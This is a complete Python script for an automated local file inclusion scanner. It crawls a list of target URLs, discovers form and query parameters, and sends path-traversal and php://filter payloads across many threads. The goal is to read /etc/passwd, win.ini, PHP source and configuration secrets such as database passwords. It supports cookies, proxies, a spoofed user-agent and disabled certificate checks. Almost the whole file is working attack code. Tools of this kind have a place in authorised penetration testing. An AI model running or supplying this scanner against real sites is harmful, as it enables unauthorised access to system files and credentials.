# --- [IMPORTS] ---
import requests
import argparse
import concurrent.futures
import base64
import sys
import hashlib
import time
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from tqdm import tqdm

# --- [CONFIGURATION] ---
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
TIMEOUT = 10

# --- [ANSI COLOR CODES] ---
class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    ENDC = '\033[0m'

# --- [DEFAULT PAYLOADS & INDICATORS] ---
# UPDATED: These are now default payloads, can be overridden by a file
DEFAULT_LFI_PAYLOADS = [
    "../../../../../../../../etc/passwd", "/etc/passwd",
    "../../../../../../../../windows/win.ini",
    "../../../../../../../../etc/passwd%00",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "php://filter/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd",
]

LFI_INDICATORS = {
    "root:x:0:0": "Linux /etc/passwd", "daemon:x:": "Linux /etc/passwd",
    "for 16-bit app support": "Windows win.ini",
    "<?php": "PHP Source Code", "DB_PASSWORD": "Config File Leak",
}

# --- [CORE FUNCTIONS] ---

def discover_parameters(url, session):
    """Discover GET and POST parameters from a single URL."""
    params = {"GET": set(), "POST": {}}
    try:
        parsed_url = urlparse(url)
        params["GET"].update(parse_qs(parsed_url.query).keys())
        response = session.get(url, verify=False, timeout=TIMEOUT)
        soup = BeautifulSoup(response.content, 'html.parser')
        for form in soup.find_all('form'):
            form_params = {tag.get('name') for tag in form.find_all(['input', 'textarea', 'select']) if tag.get('name')}
            method = form.get('method', 'get').upper()
            action_url = requests.compat.urljoin(url, form.get('action'))
            if method == "POST":
                if action_url not in params["POST"]:
                    params["POST"][action_url] = set()
                params["POST"][action_url].update(form_params)
            else:
                params["GET"].update(form_params)
    except requests.RequestException:
        pass
    return params

def get_baseline(session, url, param, method):
    """Gets a baseline response for differential comparison."""
    try:
        test_payload = "nonexistentfile12345.txt"
        if method == "GET":
            parsed_url = urlparse(url)
            original_params = parse_qs(parsed_url.query)
            original_params[param] = test_payload
            new_query = urlencode(original_params, doseq=True)
            test_target = parsed_url._replace(query=new_query).geturl()
            response = session.get(test_target, verify=False, timeout=TIMEOUT, allow_redirects=False)
        elif method == "POST":
            response = session.post(url, data={param: test_payload}, verify=False, timeout=TIMEOUT, allow_redirects=False)
        content = response.text
        return len(content), hashlib.md5(content.encode('utf-8', 'ignore')).hexdigest()
    except Exception:
        return None, None

def check_lfi(task_info):
    """Worker function to test a single parameter with a payload."""
    method, url, param, payload, session, baseline_len, baseline_hash = task_info
    response_text = ""
    test_target = url
    try:
        if method == "GET":
            parsed_url = urlparse(url)
            original_params = parse_qs(parsed_url.query)
            original_params[param] = payload
            new_query = urlencode(original_params, doseq=True)
            test_target = parsed_url._replace(query=new_query).geturl()
            response = session.get(test_target, verify=False, timeout=TIMEOUT, allow_redirects=False)
            response_text = response.text
        elif method == "POST":
            response = session.post(url, data={param: payload}, verify=False, timeout=TIMEOUT, allow_redirects=False)
            response_text = response.text
        if "base64" in payload:
            try:
                decoded_text = base64.b64decode(response_text).decode('utf-8', 'ignore')
                for indicator, indicator_type in LFI_INDICATORS.items():
                    if indicator in decoded_text:
                        return (f"[{method}] {test_target}", param, payload, f"Decoded Base64 response contains '{indicator}' ({indicator_type})")
            except Exception:
                pass
        current_len = len(response_text)
        current_hash = hashlib.md5(response_text.encode('utf-8', 'ignore')).hexdigest()
        if baseline_len is not None and current_len != baseline_len and current_hash != baseline_hash:
            for indicator, indicator_type in LFI_INDICATORS.items():
                if indicator in response_text:
                    return (f"[{method}] {test_target}", param, payload, f"High-Confidence: Found '{indicator}' after content change.")
            return (f"[{method}] {test_target}", param, payload, f"Potential: Content changed from baseline (Length: {baseline_len} -> {current_len})")
    except requests.RequestException:
        pass
    return None

# --- [MAIN EXECUTION] ---

def main():
    parser = argparse.ArgumentParser(description="An advanced LFI scanner with differential analysis.")
    parser.add_argument("-f", "--file", required=True, help="File containing a list of URLs to scan.")
    parser.add_argument("-o", "--output", default="vulnerable_lfi.txt", help="File to save vulnerable URLs.")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of concurrent threads.")
    parser.add_argument("-c", "--cookie", help="Cookie string to use for authenticated scans.")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay in seconds between each request.")
    parser.add_argument("-p", "--proxy", help="Proxy to use for requests (e.g., http://127.0.0.1:8080).")
    # NEW: Argument for custom payload file
    parser.add_argument("-pl", "--payload-list", help="File containing a custom list of LFI payloads.")
    args = parser.parse_args()

    print(f"{colors.YELLOW}🚀 Starting Advanced LFI Scanner...{colors.ENDC}")

    # NEW: Logic to load payloads from a file or use defaults
    payloads_to_test = []
    if args.payload_list:
        print(f"{colors.BLUE}[*] Loading payloads from '{args.payload_list}'...{colors.ENDC}")
        try:
            with open(args.payload_list, 'r') as f:
                payloads_to_test = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{colors.RED}Error: Payload file '{args.payload_list}' not found. Exiting.{colors.ENDC}")
            return
    else:
        print(f"{colors.BLUE}[*] Using default internal payload list.{colors.ENDC}")
        payloads_to_test = DEFAULT_LFI_PAYLOADS

    if not payloads_to_test:
        print(f"{colors.RED}Error: No payloads to test. Exiting.{colors.ENDC}")
        return

    try:
        with open(args.file, 'r') as f:
            urls = {line.strip() for line in f if line.strip()}
    except FileNotFoundError:
        print(f"{colors.RED}Error: Input file '{args.file}' not found.{colors.ENDC}")
        return

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})
    if args.cookie:
        session.headers.update({'Cookie': args.cookie})
    if args.proxy:
        session.proxies.update({'http': args.proxy, 'https': args.proxy})

    live_urls = []
    print(f"{colors.BLUE}🔍 Validating URLs and checking connectivity...{colors.ENDC}")
    for url in tqdm(urls, desc="Validating URLs"):
        try:
            response = session.head(url, verify=False, timeout=TIMEOUT, allow_redirects=True)
            if response.status_code < 400:
                live_urls.append(url)
        except requests.RequestException:
            print(f"\n{colors.YELLOW}⚠️ Warning: Could not connect to {url}. Skipping.{colors.ENDC}")

    if not live_urls:
        print(f"{colors.RED}No live URLs to scan. Exiting.{colors.ENDC}")
        return

    tasks = []
    print(f"\n{colors.BLUE}🔬 Discovering parameters and building test cases...{colors.ENDC}")
    for url in tqdm(live_urls, desc="Discovering Params"):
        discovered = discover_parameters(url, session)
        for param in discovered["GET"]:
            baseline_len, baseline_hash = get_baseline(session, url, param, "GET")
            for payload in payloads_to_test: # UPDATED to use the selected payload list
                tasks.append(("GET", url, param, payload, session, baseline_len, baseline_hash))
        for form_url, params in discovered["POST"].items():
            for param in params:
                baseline_len, baseline_hash = get_baseline(session, form_url, param, "POST")
                for payload in payloads_to_test: # UPDATED to use the selected payload list
                    tasks.append(("POST", form_url, param, payload, session, baseline_len, baseline_hash))

    if not tasks:
        print(f"{colors.YELLOW}⚠️ No parameters were discovered to test.{colors.ENDC}")
        return

    print(f"\n{colors.BLUE}🔥 Scanning with {len(tasks)} test cases across {args.threads} threads...{colors.ENDC}")
    vulnerable_links = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_task = {executor.submit(check_lfi, task): task for task in tasks}
        for future in tqdm(concurrent.futures.as_completed(future_to_task), total=len(tasks), desc="Scanning"):
            result = future.result()
            if result:
                vulnerable_links.append(result)
                url, param, payload, reason = result
                print(f"\n{colors.RED}[🔥 LFI VULNERABLE] {url}{colors.ENDC}\n"
                      f"  {colors.YELLOW}├── Parameter: {param}{colors.ENDC}\n"
                      f"  {colors.YELLOW}├── Payload: {payload}{colors.ENDC}\n"
                      f"  {colors.YELLOW}└── Reason: {reason}{colors.ENDC}\n")
            if args.delay > 0:
                time.sleep(args.delay)

    if vulnerable_links:
        print(f"\n{colors.GREEN}✅ Scan complete. Found {len(vulnerable_links)} potential vulnerabilities.{colors.ENDC}")
        with open(args.output, 'w') as f:
            f.write("--- Advanced LFI Scanner Results ---\n\n")
            for url, param, payload, reason in vulnerable_links:
                f.write(f"URL: {url}\n"
                        f"  Parameter: {param}\n"
                        f"  Payload: {payload}\n"
                        f"  Reason: {reason}\n\n")
        print(f"Results saved to: {colors.GREEN}{args.output}{colors.ENDC}")
    else:
        print(f"\n{colors.YELLOW}❌ Scan complete. No LFI vulnerabilities were found.{colors.ENDC}")

if __name__ == "__main__":
    main()
